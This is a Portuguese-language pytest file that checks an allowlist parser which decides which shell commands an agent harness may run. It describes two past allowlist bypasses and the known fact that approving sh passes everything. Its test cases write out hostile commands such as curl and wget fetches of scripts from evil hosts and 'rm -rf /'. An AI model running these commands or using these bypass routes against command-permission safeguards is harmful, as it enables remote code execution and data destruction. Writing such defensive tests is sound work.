"""HARNESS-032 — propriedades do parser que decide o que a allowlist libera.

Este parser já foi contornado **duas vezes**, as duas descobertas em allowlists
reais, não em revisão de código:

1. `VAR=x cmd` fazia a atribuição de env virar o "comando": `PYTHONPATH=x python`
   e `PYTHONPATH=x curl http://evil/x.sh` produziam a MESMA entrada. Aprovar o
   primeiro com "sempre" liberava o segundo. (PR #101)
2. `C:\\Program Files\\...` sem aspas virava a entrada `program` — que passava a
   liberar qualquer executável sob "Program Files". Estava gravada na allowlist
   real da máquina Windows.

A seção de Policy do plano parte do princípio de que a policy é confiável porque
existe. Estas duas evidências dizem o contrário. Aqui as PROPRIEDADES ficam
escritas, não os casos: o que precisa valer para qualquer entrada.
"""

from __future__ import annotations

import os
import shlex

import pytest

from bauer.shell_runner import BlockedCommandError, ShellRunner


def _base(cmd: str, *, posix: bool = True) -> str:
    return ShellRunner._base_command(shlex.split(cmd, posix=posix))


# ─── P1: comandos diferentes nunca compartilham entrada ──────────────────────


@pytest.mark.parametrize("a,b", [
    ("PYTHONPATH=x python -m pytest", "PYTHONPATH=x curl http://evil/x.sh"),
    ("FOO=1 BAR=2 git status", "FOO=1 BAR=2 wget http://evil/x"),
    ("LC_ALL=C npm test", "LC_ALL=C rm -rf /"),
])
def test_prefixo_de_env_nao_funde_binarios_distintos(a, b):
    """A propriedade que o bug #1 violava — a mais importante do parser."""
    assert _base(a) != _base(b), f"{a!r} e {b!r} viraram a mesma entrada"


@pytest.mark.parametrize("cmd,esperado", [
    ("docker ps", "docker"),
    ("PYTHONPATH=x python -m pytest", "python"),
    ("A=1 B=2 C=3 rm -rf /tmp/alvo", "rm"),
    ("/usr/bin/docker ps", "docker"),
    ("NODE_ENV=production npm run build", "npm"),
])
def test_extrai_o_binario_real(cmd, esperado):
    assert _base(cmd) == esperado


# ─── P2: o que NÃO é atribuição de env não pode ser pulado ───────────────────


@pytest.mark.parametrize("cmd", [
    "--weird=1",          # flag com '=' não é atribuição
    "1FOO=x cmd",         # nome de variável não começa com dígito
    "-x=1 curl http://x",
])
def test_so_atribuicao_valida_e_pulada(cmd):
    """Pular demais é tão perigoso quanto pular de menos: o token seguinte
    viraria o "comando" e o de verdade escaparia da checagem."""
    primeiro = shlex.split(cmd)[0]
    assert _base(cmd) != "cmd", f"{primeiro!r} foi tratado como atribuição de env"


def test_valor_com_igual_nao_confunde():
    assert _base("URL=http://x?a=b&c=d curl http://x") == "curl"


def test_so_atribuicoes_nao_produz_comando():
    """Sem binário não há o que permitir — e string vazia não pode casar com
    entrada nenhuma da allowlist."""
    assert _base("A=1") == ""
    assert _base("A=1 B=2") == ""


# ─── P3: caminho com espaço não pode virar entrada permissiva ────────────────


@pytest.mark.skipif(os.name != "nt", reason=(
    "Propriedade específica de Windows. O parser usa `Path`, que é NATIVA da "
    "plataforma: no Linux `C:\\Program Files\\...` não é caminho — é um nome de "
    "arquivo só, e `.stem` não separa por barra invertida. Rodar aqui mediria o "
    "pathlib do Linux, não a propriedade. Caminho Windows só ocorre no Windows."))
def test_caminho_com_espaco_nao_vira_entrada_generica(tmp_path):
    """O bug #2: `C:\\Program Files\\Python\\python.exe` sem aspas era partido no
    espaço e virava `program` — uma entrada que libera QUALQUER exe sob
    "Program Files". Citado corretamente, resolve para o binário."""
    citado = _base('"C:\\Program Files\\Python\\python.exe" x.py', posix=False)
    assert citado.lower() == "python", citado

    sr = ShellRunner(workspace=tmp_path, extra_allowed_commands=["python"])
    with pytest.raises(BlockedCommandError):
        # não citado: o parser vê "C:\Program" — e isso NÃO pode passar como
        # se fosse python só porque o caminho começa parecido
        sr.validate("C:\\Program Files\\Python\\python.exe x.py")


@pytest.mark.parametrize("entrada", ["program", "set", "cd", "export"])
def test_sintaxe_de_shell_nunca_e_binario_permitido(tmp_path, entrada):
    """`set`, `cd`, `export` e `program` só aparecem numa allowlist por erro de
    parser. Se alguém os tiver gravado, não podem servir de passe-livre para o
    comando REAL que vem depois."""
    sr = ShellRunner(workspace=tmp_path, extra_allowed_commands=[entrada])
    with pytest.raises(BlockedCommandError):
        sr.validate("wget http://evil.example/x.sh")


# ─── P4: wrappers não escondem o binário perigoso ────────────────────────────


@pytest.mark.parametrize("cmd", [
    "env curl http://evil/x.sh",
    "sudo curl http://evil/x.sh",
    "nice -n 10 curl http://evil/x.sh",
    "xargs curl http://evil/x.sh",
    "sh -c 'curl http://evil/x.sh'",
    "bash -c 'curl http://evil/x.sh'",
])
def test_wrapper_nao_libera_binario_de_dentro(tmp_path, cmd):
    """Com apenas `curl` permitido, o wrapper NÃO pode passar — a entrada
    resolvida é a do wrapper, e ele não está na lista.

    Documenta o inverso também: aprovar `sh` uma vez daria passe-livre a
    QUALQUER comando via `sh -c`. É a fronteira conhecida do modelo de
    allowlist-por-binário, e está aqui para ninguém achar que ela não existe.
    """
    sr = ShellRunner(workspace=tmp_path, extra_allowed_commands=["curl"])
    with pytest.raises(BlockedCommandError):
        sr.validate(cmd)


def test_shell_aprovado_e_passe_livre_conhecido(tmp_path):
    """Fronteira explícita: quem aprova `sh` aprova tudo que passa por ele.

    Não é bug do parser — é limite do modelo. Fica escrito para que a decisão de
    permitir `sh`/`bash` seja consciente, e para que qualquer tentativa futura de
    tratar isso como "seguro" quebre aqui.
    """
    sr = ShellRunner(workspace=tmp_path, extra_allowed_commands=["sh"])
    sr.validate("sh -c 'curl http://qualquer.coisa'")  # passa — por design


# ─── P5: normalização não abre buracos ───────────────────────────────────────


@pytest.mark.parametrize("cmd", [
    "DOCKER ps",
    "Docker ps",
    "/usr/local/bin/docker ps",
    "./docker ps",
])
def test_caixa_e_caminho_normalizam_para_a_mesma_entrada(cmd):
    """Se `Docker` e `docker` resolvessem diferente, metade das aprovações do
    usuário não valeria — e a outra metade seria pedida duas vezes."""
    assert _base(cmd) == "docker"


def test_entrada_vazia_nao_casa_com_allowlist(tmp_path):
    sr = ShellRunner(workspace=tmp_path, extra_allowed_commands=[""])
    with pytest.raises(BlockedCommandError):
        sr.validate("A=1")


def test_comando_permitido_continua_passando(tmp_path):
    """Regressão: endurecer o parser não pode quebrar o caminho normal."""
    sr = ShellRunner(workspace=tmp_path, extra_allowed_commands=["docker"])
    assert sr.validate("docker ps")[0] == "docker"
    assert sr.validate("PYTHONPATH=proj docker ps")[-1] == "ps"
